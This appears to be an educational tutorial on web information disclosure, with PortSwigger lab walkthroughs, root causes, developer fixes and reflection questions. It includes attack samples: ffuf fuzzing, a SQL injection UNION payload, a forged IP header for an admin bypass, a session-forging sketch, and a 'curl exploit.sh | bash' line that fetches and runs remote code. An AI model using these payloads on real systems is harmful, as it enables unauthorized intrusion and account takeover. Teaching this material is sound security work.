01 Hook

The Detective Analogy

Before we dive into technical details, understand the mindset. A hacker is a detective — and information disclosure is the crime scene they love.

"

A good detective doesn't kick down the front door immediately. They walk around the building, peek through every window, check the mailbox, read the signage — and only THEN they know exactly where to strike.

That's what Information Disclosure is. Every error message, every server header, every exposed debug page is a window left open.

— Attacker Mindset 101

🔍 What Is It?

Information Disclosure happens when a web application accidentally reveals sensitive data to users who should NOT have access to it. The data might look harmless — but to a skilled attacker, it's a roadmap.

💀 Why It Matters

It's almost always the first step of a larger attack. Hackers use leaked info to identify technologies, vulnerabilities, and entry points — turning a tiny clue into full system compromise.

03 Types

5 Types of Information Disclosure

Each type is a different window left open — some obvious, some completely invisible to the developer.

💬
1. Error Message Disclosure
When raw backend errors are displayed instead of safe, generic messages. The most common type.
❌ BAD ERROR
SELECT * FROM users WHERE id='abc'
You have an error in your SQL syntax...
Attacker learns: DB type, query format, table name
📁
2. Directory Listing
When folder browsing is enabled, the server shows all files in a directory like a file manager.
http://example.com/backups/
📄 database.sql
📦 admin.zip
⚙️ config.php
Attacker learns: Full backup files, credentials, source code
💻
3. Source Code Disclosure
Public .git folders, backup files, or misconfigured servers that expose actual application code.
example.com/.git/ → exposed
config.py: SECRET_KEY = "abc123"
Attacker learns: Auth logic, API keys, hardcoded passwords
🔑
4. Sensitive Data Exposure
Real secrets appearing directly in API responses, HTML, or JS files that clients can access.
{"email": "user@test.com",
 "token": "eyJhbGci...",
 "admin_key": "sk-9f2x..."}
Attacker learns: JWT tokens, API keys → account takeover
📡
5. Verbose HTTP Headers
Response headers that reveal exact server version, framework, OS, or technology stack.
❌ BAD
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
✓ GOOD
Server: webserver
X-Powered-By: [removed]
Attacker learns: Exact version → search CVE database → targeted exploit

Attack Stories

Dry facts don't stick. Stories do. Here's how information disclosure played out in the real world.

☠ STORY 01 — Facebook Data Exposure (2019)
What Happened
540 million user records were exposed on a publicly accessible Amazon S3 server. No authentication required to view them.
What Attacker Saw
User IDs, emails, phone numbers, account names — all readable. No passwords, but that didn't matter.
What Attacker Could Do Next
Phishing campaigns, identity theft, social engineering attacks, credential stuffing with leaked emails.

What Happened
Attacker typed a single quote into a login form. Server crashed and displayed a raw SQL error instead of a clean message.
What Attacker Saw
SQL syntax near 'SELECT * FROM accounts WHERE user_id=123' — full query structure exposed.
What Attacker Did Next
Built a SQL injection payload. Bypassed login. Dumped the entire accounts table. Game over.
05 Root Causes

The Developer Mistakes Table

Every information disclosure has a root cause. Here's the full breakdown of what goes wrong and what attackers gain.

Misconfiguration What Developer Did Wrong What Attacker Gains
Debug Mode ON Left DEBUG=True in production. Full stack traces visible to everyone. Internal logic, file paths, environment variables, SECRET_KEY values.
Poor Error Handling No try/catch. Raw exceptions propagate directly to the user's browser. Database type, query structure, table/column names — SQL injection roadmap.
Public Backup Files Uploaded backup .zip or .sql files to a public web folder during deployment. Complete database dump, source code, credentials, API keys.
Verbose HTTP Headers Left default server headers untouched. Exact software versions transmitted on every response. CVE lookup for that exact version. Targeted, automated exploit delivery.
Directory Listing Enabled Forgot to disable directory browsing in Apache/Nginx config. Full visibility into all hosted files — source code, logs, configs.
Insecure APIs No authentication, no rate limiting on API endpoints. Returns full objects. User data scraping, token harvesting, privilege escalation.
Hardcoded Secrets API keys and passwords in source code committed to public git repos. Immediate access to cloud services, payment gateways, databases.

07 Pentester Workflow

How Real Pentesters Hunt for Info Disclosure

A methodical approach used in real engagements. Not random clicks — a deliberate process to extract maximum information before touching anything.

1
Trigger Intentional Errors
Send malformed inputs to every visible parameter. Change numbers to strings, inject special characters, leave fields empty. Watch for verbose error responses.
Why: Production applications often have debug-level error handling accidentally left active. A single bad input can reveal the entire backend stack.
/product?id=' → SQL error
/product?id=abc → Type error + framework name
/product?id=99999999 → Null pointer → file paths
2
Fingerprint via HTTP Headers
Intercept every response with Burp Suite. Check Server, X-Powered-By, X-AspNet-Version, Via, and any custom headers.
Why: Headers are sent automatically by the server on every response. Developers rarely think to remove them. They're passive goldmines.
# In Burp Suite: HTTP History → any response
Server: nginx/1.18.0
X-Powered-By: Express
X-Generator: Drupal 8 ← exact version!
3
Hunt for Hidden Files & Directories
Check common paths manually and with automated tools. robots.txt, .git/, .env, backup/, sitemap.xml, /.well-known/, /admin, /api/docs.
Why: Developers create these files for convenience and forget to restrict access. robots.txt alone can reveal paths the site owner wants hidden.
# Manual checks
/robots.txt → disallowed paths leak admin areas
/.git/config → full source code access
/.env → DATABASE_URL, SECRET_KEY
/backup → database dumps
4
Read Source Code & Comments
View source on every page (Ctrl+U). Check for HTML comments, JS file references, hidden form fields, and API endpoint hints.
Why: Developers write comments for themselves ("TODO: remove this debug link"), but those comments survive into production. Every comment is a potential lead.
5
Correlate & Weaponize
Combine everything you've found. Cross-reference leaked versions with CVE databases (nvd.nist.gov, exploit-db.com). Use leaked credentials. Plan the next phase of attack.
Why: Individual pieces of information seem harmless. Combined, they form a complete attack plan. This is intelligence gathering — just like real espionage.
08 PortSwigger Labs

Hands-On Lab Walkthroughs

Four labs. Each one teaches a different flavor of information disclosure. For each lab: understand the goal, reason through the steps, internalize the lesson.

LAB 01 Information Disclosure in Error Messages APPRENTICE
🎯 Goal

Find the version number of a third-party framework revealed through a verbose error message and submit it to solve the lab.

🧠 Thinking Before You Start
Pre-Attack Reasoning
  • The app has product pages that take a productId parameter in the URL.
  • This parameter is probably used by the backend to look up a product in a database.
  • Backend code expects a number. What if I send a string? The conversion will fail.
  • If the app has poor error handling, the crash message gets sent to my browser — and that message might contain internal details.
  • My goal: provoke a crash that reveals the framework version.
⚙️ Step-by-Step with Logic
1
Open a Product Page
Navigate to any product. Observe the URL structure.
https://<lab_url>/product?productId=2
Why: We need to understand what parameters exist. productId=2 tells us the server expects a numeric value. This is our injection point.
2
Replace the Number with a Letter
Change the value to a non-numeric string and submit.
https://<lab_url>/product?productId=b
Internally: The server tries to cast "b" to an integer. This throws a type conversion exception. If the app has no proper error handler, this exception object gets serialized and sent back to your browser — complete with stack trace and framework metadata.
3
Read the Error Response
The page now shows a verbose error. Look for a version number.
Internal Server Error
Apache Struts 2.3.31 threw an exception
at com.example.ProductController.getProduct()
→ Framework version: 2.3.31 ← THIS IS YOUR ANSWER
What you learned: The exact framework version. Now search "Apache Struts 2.3.31 CVE" — you'll find critical remote code execution vulnerabilities (CVE-2017-5638, used in the Equifax breach).
🔍 Key Learning
⚡
The vulnerability: no error handling + debug-level error propagation to production. A single invalid input unlocked the framework identity — enough to find a critical CVE.
Attacker Takeaway

I now know Apache Struts 2.3.31 is running. I'll search exploit-db.com for this exact version, download a ready-made exploit, and pivot to Remote Code Execution. This one error message might be the entire breach path.

Developer Fix
  • Implement global exception handlers that catch all errors and return generic messages: "Something went wrong. Please try again."
  • Never expose stack traces, class names, line numbers, or framework details to end users.
  • Log full errors server-side (for debugging), but never transmit them to clients.
  • Remove version disclosure from all headers and error pages.
LAB 02 Information Disclosure on Debug Page APPRENTICE
🎯 Goal

Find a hidden debug page that reveals the application's SECRET_KEY environment variable. Submit the key to solve the lab.

🧠 Thinking Before You Start
Pre-Attack Reasoning
  • Developers often create debug pages during development (/debug, /phpinfo, /cgi-bin/debug).
  • These pages are meant to be removed before going live — but they often aren't.
  • Even if the URL is unusual, developers might leave a comment in the HTML source as a reminder.
  • Strategy: Try common paths first, then check page source if those fail.
⚙️ Step-by-Step with Logic
1
Try Obvious Debug Paths
/debug → 404
/debug/info → 404
/admin/debug → 404
Why this is expected: The path won't be /debug if the developer tried to hide it. But this elimination step is necessary. Now pivot to a different recon method.
2
Check the HTML Page Source
Press Ctrl+U on the home page. Search for commented text.
# In page source, search with Ctrl+F:
<!-- TODO: remove after testing -->
<!-- debug endpoint: /cgi-bin/phpinfo.php -->
Internally: HTML comments are stripped by the browser rendering engine but remain in the raw source. A developer wrote this to remind themselves, shipped to production, forgot to remove it. Now it's our breadcrumb.
3
Visit the Revealed Debug Endpoint
https://<lab_url>/cgi-bin/phpinfo.php
Why it's dangerous: Debug pages typically dump all environment variables, loaded PHP modules, server configuration, and file paths. Everything needed to understand — and attack — the system.
4
Extract SECRET_KEY
Use Ctrl+F on the debug page to search for "SECRET_KEY".
Environment Variables:
DATABASE_URL = postgresql://user:pass@db/prod
SECRET_KEY = s3cr3t-k3y-v4lu3-h3r3 ← SUBMIT THIS
DEBUG = False
Attacker Takeaway

SECRET_KEY in Django/Flask is used to sign session cookies. With this key, I can forge valid session tokens for any user — including the admin. The debug page just handed me account takeover on a silver platter.

Developer Fix
  • Never deploy debug endpoints to production. Use environment flags: if DEBUG: include debug_urls.
  • Audit all HTML comments before deployment. Automated linters can catch these.
  • Restrict debug pages by IP whitelist if they must exist: only accessible from 127.0.0.1.
  • Never log or display environment variables on any user-facing page.
LAB 03 Source Code Disclosure via Backup Files APPRENTICE
🎯 Goal

Find a hidden backup directory containing source code. Extract the hardcoded database password from the leaked source.

🧠 Thinking Before You Start
Pre-Attack Reasoning
  • Developers create backup folders when updating applications: /backup, /bak, /old, /archive.
  • These folders are often left web-accessible because they were never configured to be private.
  • Inside could be: complete source code, config files with credentials, database dumps.
  • Approach: Manually guess common backup paths, then escalate to automated fuzzing if manual fails.
⚙️ Step-by-Step with Logic
1
Guess the Backup Directory
https://<lab_url>/backup → 200 OK ✓
Why it works: "backup" is one of the most common directory names developers use. When a developer deploys an update, they often do cp -r app/ backup/ for safety — and forget to remove or secure it.
2
What is Fuzzing? (Core Concept)
🎯
Fuzzing = Automated Guessing. You give a tool a wordlist of common names (backup, admin, test, dev, old, api, v2...) and it tries them all automatically. Tools: ffuf, dirbuster, gobuster, Burp Intruder.
# Example fuzzing with ffuf
ffuf -u https://target.com/FUZZ -w /wordlists/common.txt

[200] /backup
[200] /api/v1
[301] /admin
3
Browse the Backup Directory
Index of /backup
ProductTemplate.java.bak
config.properties.bak
pom.xml
4
Open the Source File & Extract Password
// ProductTemplate.java.bak
ConnectionFactory cf = new ConnectionFactory();
cf.setHost("localhost");
cf.setUsername("admin");
cf.setPassword("s3cr3tD4t4b4s3P4ss"); ← ANSWER
Why hardcoded credentials are catastrophic: This password is now burned into every backup ever made. Changing it in the live system doesn't fix historical backups. The attacker has it forever.
Attacker Takeaway

Database password: obtained. I can now connect directly to the database server if it's externally accessible, or use these credentials to escalate privileges within the application. Backup files are the gift that keeps giving.

Developer Fix
  • Never store backup files in web-accessible directories. Use locations outside the web root.
  • Never hardcode credentials in source code. Use environment variables or secrets managers (AWS Secrets Manager, HashiCorp Vault).
  • Configure web server to block access to backup extensions: .bak, .old, .backup, .zip, .sql.
  • Rotate credentials immediately if you suspect any exposure — and scan git history for past leaks.
LAB 04 Authentication Bypass via Information Disclosure PRACTITIONER
🎯 Goal

Discover a custom HTTP header used by the application's front-end. Use it to spoof a local IP address, bypass admin authentication, and delete user carlos.

🧠 Thinking Before You Start
Pre-Attack Reasoning
  • The admin panel says "only available to local users". This means the app checks if you're connecting from localhost (127.0.0.1).
  • But how does it know your IP? Likely through an HTTP header — either standard or custom.
  • Reverse proxies often forward the client IP via headers like X-Forwarded-For.
  • If we can control the header value, we can tell the server we're from 127.0.0.1.
  • But which header? We need to discover the exact one the app uses — that's the information disclosure part.
⚙️ Step-by-Step with Logic
1
Log In and Try to Access Admin
Login with wiener:peter. Then navigate to /admin.
403 Forbidden
"Admin interface only available to local users"
Why this message is information disclosure: The error tells us the exact restriction mechanism. "Local users" means IP-based access control. Now we know exactly what to bypass.
2
Send Request to Burp Suite Repeater
Intercept the GET /admin request in Burp. Send to Repeater. Now we can modify and resend it.
Why Repeater: We need to experiment with adding different HTTP headers. Repeater lets us modify requests manually and observe responses in real time without going through the browser.
3
Use TRACE Method to Discover Custom Headers
Send a TRACE request to the server. This is the key intelligence-gathering step.
TRACE / HTTP/1.1
Host: target.com
Response (TRACE echo):
TRACE / HTTP/1.1
Host: target.com
X-Custom-IP-Authorization: 178.34.91.12 ← FRONT-END ADDED THIS
Why TRACE reveals this: The TRACE method reflects back the exact request as received by the server — including headers added by intermediate proxies and front-end servers. The custom header is now exposed.
4
Forge the Header with Localhost IP
GET /admin HTTP/1.1
Host: target.com
X-Custom-IP-Authorization: 127.0.0.1
Why this works: The server reads this header and assumes you're connecting from localhost. It doesn't verify — it trusts. This is the fundamental flaw: trusting client-controlled headers for security decisions.
5
Access Admin Panel & Delete Carlos
200 OK — Admin Panel Loaded ✓
Action: Click "Delete" next to user: carlos
✓ User carlos deleted. Lab solved.
Right-click → "Show response in browser" in Burp to interact with the admin panel through the browser while keeping your forged header active.
🔍 Key Learning
🔥
Two vulnerabilities combined: TRACE method enabled (revealed the custom header) + trusting client-controlled headers for auth (allowed IP spoofing). Each alone might seem minor. Together: full admin bypass.
Attacker Takeaway

I now have admin access. From here I can: create new admin accounts, download user data, modify application behavior, or pivot to the underlying server. One leaked header name + one forged request = complete compromise.

Developer Fix
  • Disable the TRACE HTTP method on all production servers. It has no legitimate use in production.
  • Never use client-supplied headers (X-Forwarded-For, custom IP headers) as the sole means of authentication or authorization.
  • Implement proper session-based authentication for admin areas — not IP-based access control.
  • If IP-based restrictions are required, implement them at the network/firewall level, not in application code.
09 Advanced Insight

Information Disclosure → Full Compromise

This is why information disclosure sits at the very top of the attack chain. It's the ignition key for every other attack class.

🧠
The Fundamental Truth: Attackers don't usually find a single catastrophic flaw and exploit it immediately. They gather 10 small clues, each harmless alone, and assemble them into a complete attack. Information disclosure provides those clues.
Info Disclosure

🗃️ Leads to SQL Injection ▼

An error message reveals the database type and query structure. The attacker now knows exactly how to format a SQL injection payload. Without this leak, they'd be guessing blindly. With it, they have a precise target.

Error: MySQL 5.7 syntax error near 'WHERE id='
→ Attacker knows: MySQL, query uses id field
→ Crafts: ?id=1 UNION SELECT user,pass FROM admin--
👤 Leads to Account Takeover ▼

A leaked SECRET_KEY allows forging session cookies. A leaked token from an API response gives direct account access. A debug page exposes admin credentials. Each one is account takeover on a silver platter.

Leaked SECRET_KEY → forge any Django session cookie
→ Set session["user_id"] = 1 (admin)
→ Sign with stolen key → Full admin access
💻 Leads to RCE ▼

Version disclosure reveals Apache Struts 2.3.31 → CVE-2017-5638 → Remote Code Execution. The Equifax breach (143 million records) started with a server header revealing an outdated framework version.

Header: X-Powered-By: Struts 2.3.31
→ CVE-2017-5638 → OGNL injection
→ curl exploit.sh | bash → shell on server
10 Summary

Quick Revision

Everything you need to remember — on one screen.

Definition
Unintentional exposure of sensitive data to unauthorized users. The data reveals system internals, credentials, or infrastructure details.
5 Types
Error messages, Directory listing, Source code (.git), Sensitive data in responses, Verbose HTTP headers.
Why Dangerous
It's always the first step. Every bigger attack (SQLi, RCE, ATO) requires information gathered through disclosure.
Root Causes
Debug mode in prod, poor error handling, public backups, verbose headers, insecure file permissions, hardcoded creds.
Pentester Workflow
Trigger errors → Fingerprint headers → Fuzz directories → Read source/comments → Correlate and weaponize.
4 Lab Lessons
Error → version leak → CVE. Source comment → debug page → SECRET_KEY. Backup dir → source → DB password. TRACE → custom header → admin bypass.
Core Fix Philosophy
Show generic errors to users. Log full errors server-side only. Remove debug endpoints. Suppress version headers. Never hardcode secrets.
Key Tools
Burp Suite (intercept, repeater), ffuf/gobuster (dir fuzzing), curl (header inspection), View Source (comment hunting).

🧠 Reflection

Think Like an Attacker

These aren't quiz questions with right or wrong answers. They're designed to stretch your threat modeling muscle.

01
A website returns a completely blank page for all errors. No information is exposed. From an attacker's perspective, is this better or worse than verbose errors? What can you still infer from response timing, status codes, and headers even with no body content?
02
A developer argues: "The framework version in our headers is publicly known anyway — everyone knows we use Django. Why bother hiding it?" How would you counter this argument? What principle of security does hiding versions serve?
03
You're doing a pentest and find a /backup directory with a 200 response but empty contents. The attacker before you cleaned up. What evidence might still exist that could reveal what was there? Think about server logs, cache headers, wayback machine, git history.
04
An application uses a SECRET_KEY to sign JWTs. The key is leaked via a debug page. Even if the developer changes the key immediately after discovering the leak, what window of opportunity did the attacker have? What sessions are now permanently compromised?
05
robots.txt is meant to tell search engines which paths NOT to index. But pentesters read it eagerly. Explain the paradox: by trying to hide paths from Google, are developers inadvertently advertising them to attackers?
06
You compromise a system using information from an information disclosure vulnerability. From a legal standpoint, even if the information was "publicly visible" (no auth required), were you authorized to use it? How does this apply to bug bounty programs vs unauthorized testing?
